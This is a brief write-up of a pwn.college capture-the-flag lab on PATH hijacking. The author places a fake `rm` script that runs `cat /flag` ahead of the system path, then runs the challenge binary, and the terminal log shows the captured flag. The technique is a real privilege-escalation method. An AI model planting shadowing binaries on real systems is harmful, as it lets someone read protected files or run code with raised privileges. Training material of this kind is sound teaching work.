# Hijacking Commands
## Introduction
This Prompt for this challenge leaves much to be uncovered,so in the general spirit of messing around with programs and seeing if it works,
I guessed we would have to 'hijack' the `rm ` command, as even if `rm` is disabled, the flag wont be printed
## Approach
- I first write a replacement `rm` script using `nano rm`, the purpose of this script is print the flag
- now I add `/home/hacker`to the PATH Variable using `export PATH=/home/hacker:$PATH`(one very important thing to note here is that `/home/hacker` **must** come before the PATH it is being appended, refer to the stack exchange post below for more information)
- Finally I run `/challenge/run` which attempts to `rm /flag` but because my dummy `rm` runs first, it prints the flag instead
## Code
### rm
```bash
!#/bin/bash
cat /flag
```
### main terminal
```bash
root@DESKTOP-MPJ395R:~# ssh -i ./key hacker@dojo.pwn.college
Connected!
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ ~
ssh-entrypoint: /home/hacker: Is a directory
hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ echo $PATH
/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{kevcZrf0SqORPXepZiBFLLveEBm.ddzNyUDLzgTN0czW}
```
## Additional Reading
- https://unix.stackexchange.com/questions/335723/if-2-commands-with-same-filename-exists-in-path-variable-which-will-get-execute
  
